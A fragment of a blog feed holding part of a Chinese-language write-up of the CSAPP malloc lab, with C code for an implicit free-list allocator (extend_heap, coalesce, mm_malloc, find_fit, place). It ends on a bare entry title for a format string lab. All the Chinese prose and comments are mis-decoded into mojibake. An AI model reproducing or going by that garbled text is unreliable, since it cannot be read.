<span class="hljs-keyword">char</span> *mem_brk;        <span class="hljs-comment">/* points to last byte of heap */</span><br></code></pre></td></tr></table></figure><p>mem_sbrkå‡½æ•°è¿”å›old_brkï¼Œold_brkæ˜¯å †å¢é•¿å‰çš„çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„æŒ‡é’ˆ</p><p>ä¹‹åï¼Œåœ¨mm_initå‡½æ•°ä¸­ï¼Œä½¿ç”¨äº†å››ä¸ªPUTï¼Œå¯¹å †çš„åˆå§‹ç©ºé—´çš„å››ä¸ªå­—è¿›è¡Œäº†åˆå§‹åŒ–å·¥ä½œ</p><p>å¯¹ç©ºå †çš„åˆå§‹åŒ–å®Œæˆä¹‹åï¼Œä½¿ç”¨extend_heapå‡½æ•°æ‹“å±•å †çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">extend_heap</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> words)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *bp;<br>    <span class="hljs-keyword">size_t</span> size;<br><br>    <span class="hljs-comment">/* ä¸ºäº†8å­—èŠ‚å¯¹é½ï¼Œä¼ å…¥çš„wordsåº”è¯¥æ˜¯2çš„æ•´æ•°å€ï¼Œæ¯”å¦‚2,4,8 ä»¥æ»¡è¶³8å­—èŠ‚å€æ•°çš„è¦æ±‚ Allocate an even number of words to maintain alignment */</span><br>    size = (words % <span class="hljs-number">2</span>) ? (words + <span class="hljs-number">1</span>) * WSIZE : words * WSIZE;<br>    <span class="hljs-comment">// è°ƒç”¨mem_sbrk ç”³è¯·sizeå­—èŠ‚çš„å†…å­˜ï¼Œå¦‚æœå¤±è´¥ï¼Œè¿”å›NULLï¼Œbpæ˜¯æŒ‡å‘æ–°ç”³è¯·çš„å†…å­˜çš„åº•éƒ¨çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">long</span>)(bp = mem_sbrk(size)) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* Initialize free block header/footer and the epilogue header */</span><br>    <span class="hljs-comment">/* è¿™é‡Œbpè¢«å½“åšæŒ‡å‘å—çš„æŒ‡é’ˆï¼Œputå®å°†ä¼šè¦†ç›–å°¾å£°å—*/</span><br>    <span class="hljs-comment">/* ç»™æ–°å¼€è¾Ÿçš„ç©ºé—´è®¾ç½®å¤´éƒ¨å’Œè„šéƒ¨ï¼Œå¹¶æ ‡è®°ä¸ºæœªåˆ†é…çŠ¶æ€*/</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));         <span class="hljs-comment">/* Free block header */</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));         <span class="hljs-comment">/* Free block footer */</span><br>    <span class="hljs-comment">/* ç”±äºå°¾å£°å—è¢«è¦†ç›–ï¼Œè¿™é‡Œå°†å°¾å£°å—æ”¾åˆ°æ–°å¼€è¾Ÿç©ºé—´çš„åé¢ï¼Œä½œä¸ºç»“æŸæ ‡å¿—*/</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* New epilogue header*/</span><br>    <span class="hljs-comment">/* è¿™é‡Œåˆ†é…äº†ä¸€ä¸ªæ–°çš„å—ï¼Œå‡è®¾å‰ä¸€ä¸ªå—æ˜¯æœªåˆ†é…çŠ¶æ€ï¼Œé‚£ä¹ˆå‰åä¸¤ä¸ªå—éœ€è¦è¿›è¡Œåˆå¹¶ */</span><br>    <span class="hljs-comment">/* coalesceå‡½æ•°è¿”å›åˆå¹¶åçš„ç©ºé—²å—çš„æŒ‡é’ˆ*/</span><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é¦–å…ˆå¯¹ä¼ å…¥çš„å­—è¿›è¡Œå¤„ç†ï¼Œä¸ºäº†ä¿æŒ8å­—èŠ‚å¯¹é½ï¼Œä¼ å…¥çš„wordsåº”è¯¥æ˜¯2çš„æ•´æ•°å€</li><li>è°ƒç”¨mem_sbrkè¿›è¡Œå †ç©ºé—´çš„ç”³è¯·</li><li>ç»™æ–°åˆ†é…çš„å¤§å°ä¸ºsizeçš„ç©ºé—´è¿›è¡Œåˆå§‹åŒ–ï¼Œå°†å¤´éƒ¨å’Œè¶³éƒ¨è®¾ç½®ä¸ºsizeå¤§å°ï¼Œæœªåˆ†é…<ul><li>æ³¨æ„åˆ°ï¼Œè¿™é‡Œåˆ†é…æ–°å—æ—¶å°†åŸå…ˆçš„å°¾å£°å—è¦†ç›–äº†</li></ul></li><li>è®¾ç½®æ–°çš„å°¾å£°å—</li><li>è°ƒç”¨coalesceå‡½æ•°</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305312011844.png"></p><h2 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h2><p>è¯¥å‡½æ•°é‡Šæ”¾ptræŒ‡å‘çš„å—çš„ç©ºé—´</p><ul><li>è·å–å—çš„å¤§å°</li><li>å°†å—çš„å¤´è„šéƒ¨çš„æ ‡å¿—ä½éƒ½æ”¹ä¸º0ï¼Œä¹Ÿå³æ ‡è®°ä¸ºæœªåˆ†é…</li><li>å°†è¿™ä¸ªå—ç½®ä¸ºç©ºé—²ï¼Œå¯èƒ½ä¼šå¯¼è‡´åˆå¹¶æ“ä½œï¼Œå› æ­¤éœ€è¦è°ƒç”¨coalesceå‡½æ•°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_free - Freeing a block does nothing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mm_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">/*è·å–ptræŒ‡å‘çš„å—çš„å¤§å°*/</span><br>    <span class="hljs-keyword">size_t</span> size = GET_SIZE(HDRP(ptr));<br>    <span class="hljs-comment">/*å°†å—çš„å¤´è„šéƒ¨çš„æ ‡å¿—ä½éƒ½æ”¹ä¸º0ï¼Œä¹Ÿå³æ ‡è®°ä¸ºæœªåˆ†é…*/</span><br>    PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    <span class="hljs-comment">/*freeæ“ä½œä¼´éšç€å››ç§åˆå¹¶çš„å¯èƒ½*/</span><br>    coalesce(ptr);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h2><p>å—çš„åˆå¹¶æ“ä½œï¼Œå»ºè®®é…åˆä¹¦ä¸Šçš„å››ä¸ªåˆå¹¶æƒ…å†µçš„é…å›¾è§‚èµ</p><ul><li>å‰åå—éƒ½å·²åˆ†é…</li><li>å‰å—å·²åˆ†é…ï¼Œåå—æœªåˆ†é…</li><li>å‰å—æœªåˆ†é…ï¼Œåå—å·²åˆ†é…</li><li>å‰åå—éƒ½æœªåˆ†é…</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* å—çš„åˆå¹¶æ“ä½œ */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">coalesce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(ptr)));<span class="hljs-comment">//è·å–å‰ä¸€ä¸ªå—çš„åˆ†é…çŠ¶æ€</span><br>    <span class="hljs-keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));<span class="hljs-comment">// è·å–åä¸€ä¸ªå—çš„åˆ†é…çŠ¶æ€</span><br>    <span class="hljs-keyword">size_t</span> size = GET_SIZE(HDRP(ptr));<span class="hljs-comment">//è·å–å½“å‰å—çš„å¤§å°</span><br>    <br>    <span class="hljs-comment">// æ ¹æ®å‰åå—çš„åˆ†é…çŠ¶æ€ï¼Œè¿›è¡Œå››ç§åˆå¹¶æ“ä½œ</span><br>    <span class="hljs-comment">// 1.å‰åå—éƒ½å·²åˆ†é…</span><br>    <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;<br>        <span class="hljs-keyword">return</span> ptr;<br>    &#125;<br>    <span class="hljs-comment">// 2.å‰å—å·²åˆ†é…ï¼Œåå—æœªåˆ†é…</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(ptr)));<span class="hljs-comment">// å½“å‰å—çš„å¤§å°+åå—çš„å¤§å°</span><br>        PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-comment">// 3.å‰å—æœªåˆ†é…ï¼Œåå—å·²åˆ†é…</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(ptr)));<span class="hljs-comment">// å½“å‰å—çš„å¤§å°+å‰å—çš„å¤§å°</span><br>        PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));        <span class="hljs-comment">// åˆå¹¶å½“å‰å—+å‰å—ï¼Œæ›´æ–°å½“å‰å—çš„å¤´éƒ¨ã€è„šéƒ¨ã€åˆ†é…çŠ¶æ€</span><br>        PUT(HDRP(PREV_BLKP(ptr)),PACK(size, <span class="hljs-number">0</span>));<br>        ptr = PREV_BLKP(ptr);<br>    &#125;<br>    <span class="hljs-comment">// 4.å‰åå—éƒ½æœªåˆ†é…</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(ptr))) + GET_SIZE(FTRP(NEXT_BLKP(ptr)));<br>        PUT(HDRP(PREV_BLKP(ptr)), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(NEXT_BLKP(ptr)), PACK(size, <span class="hljs-number">0</span>));<br>        ptr = PREV_BLKP(ptr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ptr;<span class="hljs-comment">//è¿”å›åˆå¹¶åçš„å—çš„æŒ‡é’ˆ</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h2><p>çœ‹ä¸€ä¸‹labæä¾›çš„åŸå§‹ç‰ˆæœ¬çš„mm_mallocå‡½æ•°ï¼Œ<del>å‘ç°è¿™ä¸ªå®ç°ä¸å°±æ˜¯æ‰¯æ·¡å—</del>ã€‚mm_mallocå‡½æ•°ä»…ä»…ä½¿ç”¨mem_sbrkå‡½æ•°ç”³è¯·å¯¹é½åçš„sizeå¤§å°çš„å †ç©ºé—´ï¼Œç„¶åå¯¹å—å†™å…¥sizeå€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span><br><span class="hljs-comment"> *     Always allocate a block whose size is a multiple of the alignment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mm_malloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> newsize = ALIGN(size + SIZE_T_SIZE);<br>    <span class="hljs-keyword">void</span> *p = mem_sbrk(newsize);<br>    <span class="hljs-keyword">if</span> (p == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br>        *(<span class="hljs-keyword">size_t</span> *)p = size;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p + SIZE_T_SIZE);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„mm_mallocå®ç°å¢åŠ äº†ï¼š</p><ul><li>ç‰¹æ®Šsizeå€¼ï¼ˆ0ï¼‰çš„å¤„ç†</li><li>ä½¿ç”¨findå‡½æ•°åœ¨ç©ºé—²é“¾è¡¨ä¸­æŸ¥æ‰¾åˆé€‚å¤§å°çš„ç©ºé—²å—</li><li>ä½¿ç”¨placeå‡½æ•°å°†ç©ºé—²å—åˆ†é…ç»™è¯·æ±‚</li><li>å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆé€‚å¤§å°çš„ç©ºé—²å—ï¼Œåˆ™éœ€è¦ä½¿ç”¨extend_heapå‡½æ•°æ‰©å±•å †çš„å¤§å°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span><br><span class="hljs-comment"> *     Always allocate a block whose size is a multiple of the alignment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mm_malloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> asize; <span class="hljs-comment">/* Adjust block size */</span>  <span class="hljs-comment">// è°ƒæ•´åçš„å—å¤§å°</span><br>    <span class="hljs-keyword">size_t</span> extendsize; <span class="hljs-comment">/* Amount to extend heap if no fit */</span>  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰åˆé€‚çš„å—ï¼Œåˆ™éœ€è¦æ‰©å±•å †çš„å¤§å°</span><br>    <span class="hljs-keyword">char</span> *ptr;<br><br>    <span class="hljs-comment">/* Ignore spurious requests */</span><br>    <span class="hljs-keyword">if</span>(size == <span class="hljs-number">0</span>)&#123;  <span class="hljs-comment">// å¦‚æœè¯·æ±‚çš„å¤§å°ä¸º0ï¼Œåˆ™è¿”å›NULL</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Adjust block size to include overhead and alignment reqs. */</span><br>    <span class="hljs-keyword">if</span>(size &lt;= DSIZE)&#123;  <span class="hljs-comment">// å¦‚æœè¯·æ±‚çš„å¤§å°å°äºç­‰äºDSIZEï¼Œåˆ™å°†å—å¤§å°è®¾ç½®ä¸º2 * DSIZE</span><br>        asize = <span class="hljs-number">2</span> * DSIZE; <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// å¦åˆ™ï¼Œå°†å—å¤§å°è®¾ç½®ä¸ºDSIZEçš„å€æ•°ï¼Œæ»¡è¶³å¯¹é½è¦æ±‚</span><br>        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="hljs-number">1</span>)) / DSIZE); <br>    &#125;<br><br>    <span class="hljs-comment">/* Search the free list for a fit */</span><br>    <span class="hljs-keyword">if</span>((ptr = find_fit(asize)) != <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// åœ¨ç©ºé—²é“¾è¡¨ä¸­æŸ¥æ‰¾åˆé€‚å¤§å°çš„ç©ºé—²å—</span><br>        place(ptr, asize);  <span class="hljs-comment">// å°†ç©ºé—²å—åˆ†é…ç»™è¯·æ±‚</span><br>        <span class="hljs-keyword">return</span> ptr;  <span class="hljs-comment">// è¿”å›æŒ‡å‘åˆ†é…çš„ç©ºé—´çš„æŒ‡é’ˆ</span><br>    &#125;<br><br>    <span class="hljs-comment">/* No fit found. Get more memory and place the block */</span><br>    extendsize = MAX(asize, CHUNKSIZE);  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆé€‚å¤§å°çš„ç©ºé—²å—ï¼Œåˆ™éœ€è¦æ‰©å±•å †çš„å¤§å°ï¼Œæ‰©å±•çš„å¤§å°ä¸ºè¯·æ±‚å¤§å°å’Œä¸€ä¸ªé»˜è®¤çš„ CHUNKSIZE ä¸­çš„è¾ƒå¤§å€¼</span><br>    <span class="hljs-keyword">if</span>((ptr = extend_heap(extendsize/WSIZE)) == <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// æ‰©å±•å †çš„å¤§å°ï¼Œå¹¶å°†æ–°åˆ†é…çš„ç©ºé—´åˆ’åˆ†ä¸ºä¸€ä¸ªæ–°çš„ç©ºé—²å—</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// å¦‚æœæ‰©å±•å¤±è´¥ï¼Œåˆ™è¿”å›NULL</span><br>    &#125;<br>    place(ptr, asize);  <span class="hljs-comment">// å°†æ–°åˆ†é…çš„ç©ºé—´åˆ†é…ç»™è¯·æ±‚</span><br>    <span class="hljs-keyword">return</span> ptr;  <span class="hljs-comment">// è¿”å›æŒ‡å‘åˆ†é…çš„ç©ºé—´çš„æŒ‡é’ˆ</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>éå†å †ç©ºé—´ï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å¤§å°çš„ç©ºé—²å—ï¼Œå¹¶è¿”å›æŒ‡å‘è¯¥ç©ºé—²å—çš„æŒ‡é’ˆã€‚å¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * <span class="hljs-title">find_fit</span><span class="hljs-params">(<span class="hljs-keyword">ssize_t</span> asize)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *bp;<br>    <span class="hljs-comment">/* éå†ç©ºé—²é“¾è¡¨ï¼Œå¯»æ‰¾åˆé€‚å¤§å°çš„ç©ºé—²å— */</span><br>    <span class="hljs-keyword">for</span>(bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="hljs-number">0</span>; bp = NEXT_BLKP(bp)) &#123;<br>        <span class="hljs-comment">/* å¦‚æœæ‰¾åˆ°åˆé€‚å¤§å°çš„ç©ºé—²å—ï¼Œåˆ™è¿”å›æŒ‡å‘è¯¥ç©ºé—²å—çš„æŒ‡é’ˆ */</span><br>        <span class="hljs-keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;<br>            <span class="hljs-keyword">return</span> bp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* No fit */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>ç»™å®šç©ºé—²å—çš„æŒ‡é’ˆå’Œéœ€è¦åˆ†é…çš„å †ç©ºé—´çš„å¤§å°ï¼Œå¯¹å—è¿›è¡Œåˆ†é…</p><ul><li>å¦‚æœç©ºé—²å—çš„å¤§å°å‡å»è¯·æ±‚çš„å¤§å°å¤§äºç­‰äº16ä¸ªå­—èŠ‚ï¼ˆå¤´éƒ¨4å­—èŠ‚ã€è„šéƒ¨4å­—èŠ‚+8å­—èŠ‚ä½œä¸ºå¡«å……ï¼‰ï¼Œé‚£ä¹ˆå°±å°†ç©ºé—²å—åˆ†å‰²ä¸ºä¸¤éƒ¨åˆ†</li><li>å¦åˆ™ï¼Œå¦‚æœç©ºé—²å—çš„å¤§å°å‡å»è¯·æ±‚çš„å¤§å°å°äºä¸¤ä¸ªå­—ï¼Œé‚£ä¹ˆå°†æ•´ä¸ªç©ºé—²å—åˆ†é…ç»™è¯·æ±‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">place</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *bp, <span class="hljs-keyword">size_t</span> asize)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> csize = GET_SIZE(HDRP(bp));  <span class="hljs-comment">// è·å–ç©ºé—²å—çš„å¤§å°</span><br>    <span class="hljs-comment">/* å¦‚æœç©ºé—²å—çš„å¤§å°å¤§äºè¯·æ±‚çš„å¤§å°ï¼Œåˆ™å°†ç©ºé—²å—åˆ†å‰²ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†åˆ†é…ç»™è¯·æ±‚ï¼Œå¦ä¸€éƒ¨åˆ†ä»ç„¶æ˜¯ç©ºé—²å— */</span><br>    <span class="hljs-keyword">if</span>((csize - asize) &gt;= (<span class="hljs-number">2</span> * DSIZE)) &#123;<br>        <span class="hljs-comment">/* å°†ç©ºé—²å—åˆ†å‰²ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†åˆ†é…ç»™è¯·æ±‚ï¼Œå¦ä¸€éƒ¨åˆ†ä»ç„¶æ˜¯ç©ºé—²å— */</span><br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// è®¾ç½®åˆ†é…å—çš„å¤´éƒ¨</span><br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// è®¾ç½®åˆ†é…å—çš„è„šéƒ¨</span><br>        bp = NEXT_BLKP(bp);  <span class="hljs-comment">// å°†æŒ‡é’ˆæŒ‡å‘å‰©ä½™çš„ç©ºé—²å—</span><br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));  <span class="hljs-comment">// è®¾ç½®å‰©ä½™ç©ºé—²å—çš„å¤´éƒ¨</span><br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));  <span class="hljs-comment">// è®¾ç½®å‰©ä½™ç©ºé—²å—çš„è„šéƒ¨</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// å¦åˆ™ï¼Œå°†æ•´ä¸ªç©ºé—²å—åˆ†é…ç»™è¯·æ±‚</span><br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// è®¾ç½®åˆ†é…å—çš„å¤´éƒ¨</span><br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// è®¾ç½®åˆ†é…å—çš„è„šéƒ¨</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h2><p>æ ¹æ®æ–‡æ¡£ï¼Œè¯¥å‡½æ•°å…·æœ‰ä»¥ä¸‹çº¦æŸã€‚</p><ul><li>å¦‚æœ ptr ä¸º NULLï¼Œè°ƒç”¨ç­‰åŒäº mm_malloc(size)ï¼›</li><li>å¦‚æœ size ç­‰äºé›¶ï¼Œåˆ™è°ƒç”¨ç­‰åŒäº mm_free(ptr)ï¼›</li><li>å¦‚æœ ptr ä¸ä¸º NULLï¼Œåˆ™å®ƒå¿…é¡»ç”±å…ˆå‰å¯¹ mm malloc æˆ– mm realloc çš„è°ƒç”¨è¿”å›ã€‚è°ƒç”¨ mm realloc å°† ptrï¼ˆæ—§å—ï¼‰æŒ‡å‘çš„å†…å­˜å—çš„å¤§å°æ›´æ”¹ä¸º size bytes å¹¶è¿”å›æ–°å—çš„åœ°å€ã€‚è¯·æ³¨æ„ï¼Œæ–°å—çš„åœ°å€å¯èƒ½ä¸æ—§å—çš„åœ°å€ç›¸åŒï¼Œä¹Ÿå¯èƒ½ä¸åŒï¼Œå…·ä½“å–å†³äºæ‚¨çš„å®ç°ã€æ—§å—ä¸­çš„å†…éƒ¨ç¢ç‰‡é‡ä»¥åŠ realloc è¯·æ±‚çš„å¤§å°ã€‚æ–°å—çš„å†…å®¹ä¸æ—§ ptr å—çš„å†…å®¹ç›¸åŒï¼Œç›´åˆ°æ–°æ—§å¤§å°ä¸­çš„æœ€å°å€¼ã€‚å…¶ä»–ä¸€åˆ‡éƒ½æœªåˆå§‹åŒ–ã€‚</li><li>å¦‚æœæ—§å—ä¸º 8 ä¸ªå­—èŠ‚ï¼Œæ–°å—ä¸º 12 ä¸ªå­—èŠ‚ï¼Œåˆ™æ–°å—çš„å‰ 8 ä¸ªå­—èŠ‚ä¸æ—§å—çš„å‰ 8 ä¸ªå­—èŠ‚ç›¸åŒï¼Œæœ€å 4 ä¸ªå­—èŠ‚æœªåˆå§‹åŒ–ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœæ—§å—æ˜¯ 8 ä¸ªå­—èŠ‚è€Œæ–°å—æ˜¯ 4 ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ–°å—çš„å†…å®¹ä¸æ—§å—çš„å‰ 4 ä¸ªå­—èŠ‚ç›¸åŒã€‚</li></ul><h1 id="æ˜¾ç¤ºç©ºé—²é“¾è¡¨å®ç°"><a href="#æ˜¾ç¤ºç©ºé—²é“¾è¡¨å®ç°" class="headerlink" title="æ˜¾ç¤ºç©ºé—²é“¾è¡¨å®ç°"></a>æ˜¾ç¤ºç©ºé—²é“¾è¡¨å®ç°</h1><p>//todo</p><p><img src=""></p><p>æˆ‘çš„åšå®¢å³å°†åŒæ­¥è‡³è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒºï¼Œé‚€è¯·å¤§å®¶ä¸€åŒå…¥é©»ï¼š<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2w4v1usqstus0">https://cloud.tencent.com/developer/support-plan?invite_code=2w4v1usqstus0</a></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šFormat String Vulnerability Lab</title>
    <link href="/p/df8f6639/"/>
